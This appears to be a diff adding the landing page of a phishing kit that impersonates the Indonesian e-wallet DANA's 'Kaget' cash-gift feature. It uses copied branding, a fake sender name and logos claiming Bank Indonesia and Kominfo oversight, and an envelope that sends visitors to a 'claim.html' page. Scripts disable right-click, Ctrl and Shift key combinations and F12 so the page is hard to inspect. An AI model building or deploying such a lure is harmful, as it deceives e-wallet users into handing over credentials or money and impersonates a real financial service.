@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="en"><head>
+        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <meta name="theme-color" content="#178EE5">
+        <title>DANA Kaget Buatmu</title>
+        <meta property="og:title" content="DANA Kaget Buatmu">
+        <meta property="twitter:title" content="DANA Kaget Buatmu">
+        <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image" content="https://external.fpku7-1.fna.fbcdn.net/emg1/v/t13/17292968639655477202?url=http%3A%2F%2Fa.m.dana.id%2Fresource%2Fimgs%2Fskywalker%2Fdeeplinkpreview%2Fdana_kaget.png&amp;fb_obo=1&amp;utld=dana.id&amp;stp=c0.5000x0.5000f_dst-emg0_p412x215_q75_tt6&amp;_nc_eui2=AeEC7ESiM9F9XvL9wT96p3i0MtHUvapWgiUy0dS9qlaCJbkj-e02XcS6ljDyrhKZJyV0yyA5GG-fT6JHi2q19gFW&amp;ccb=13-1&amp;oh=06_Q399lf5ClTLuOP9gOPYg-kup6P_wXvp8ENH2MLjogx87m0w&amp;oe=67B3DAE0&amp;_nc_sid=b01ad3">
+        <meta data-n-head="ssr" data-hid="og:image" property="og:image" content="https://external.fpku7-1.fna.fbcdn.net/emg1/v/t13/17292968639655477202?url=http%3A%2F%2Fa.m.dana.id%2Fresource%2Fimgs%2Fskywalker%2Fdeeplinkpreview%2Fdana_kaget.png&amp;fb_obo=1&amp;utld=dana.id&amp;stp=c0.5000x0.5000f_dst-emg0_p412x215_q75_tt6&amp;_nc_eui2=AeEC7ESiM9F9XvL9wT96p3i0MtHUvapWgiUy0dS9qlaCJbkj-e02XcS6ljDyrhKZJyV0yyA5GG-fT6JHi2q19gFW&amp;ccb=13-1&amp;oh=06_Q399lf5ClTLuOP9gOPYg-kup6P_wXvp8ENH2MLjogx87m0w&amp;oe=67B3DAE0&amp;_nc_sid=b01ad3">
+        <meta data-n-head="ssr" data-hid="og:site_name" name="og:site_name" content="DANA.id">
+        <meta property="og:url" content="https://dana.id">
+        <meta property="og:description" content="DANA Kaget Cuma buat kamu yang paling gesit! Sikat sekarang!"><meta property="twitter:description" content="DANA Kaget Cuma buat kamu yang paling gesit! Sikat sekarang!">
+        <link data-n-head="ssr" rel="icon" type="image/x-icon" href="favicon.ico">
+        <link rel="stylesheet" href="css/index.css">
+    </head>
+<body>
+<div class="container_yondahost" style="display:none;">
+
+  <div class="text_amplop">
+    <h4>Tap amplop buat <br> liat DANA kaget</h4>
+  </div>
+  <img onclick="location.href='claim.html'" src="images/amplop1_1_1.jpg" alt="" class="amplop">
+  <div class="punyadaget">
+      <img src="images/profile.jpg" alt="">
+      <div class="group_text">
+         <h5>Dari</h5>
+         <h3>Bella Cantika</h3>
+      </div>
+  </div>
+</div>
+
+<div sty="" class="start" style="display:none;">
+      <img class="logo" src="images/logoDana.png">
+        <div class="footimg">
+         <img src="images/bi.png" alt="">
+         <img src="images/kom.png" alt="">
+         <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+      </div>
+    </div>
+
+<script src="js/jquery-3.5.1.min.js">
+</script>
+<script src="js/jquery.mask.min.js"></script>
+
+
+<script>
+window.onload = function()
+{
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container_yondahost").fadeIn(200);
+                   $(".container_yondahost").focus();
+                },1000);
+            },2000);
+        },500);
+}
+</script>
+
+<script>
+    var addHandler = function (element, type, handler) {
+	if (element.addEventListener) {
+		element.addEventListener(type, handler, false);
+	} else if (element.attachEvent) {
+		element.attachEvent("on" + type, handler);
+	} else {
+		element["on" + type] = handler;
+	}
+};
+
+var preventDefault = function (event) {
+	if (event.preventDefault) {
+		event.preventDefault();
+	} else {
+		event.returnValue = false;
+	}
+};
+
+addHandler(window, "contextmenu", function (event) {
+	preventDefault(event);
+});
+
+document.onkeydown = function (event) {
+	if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {
+		return false;
+	}
+};
+</script>
+
+
+</body></html>
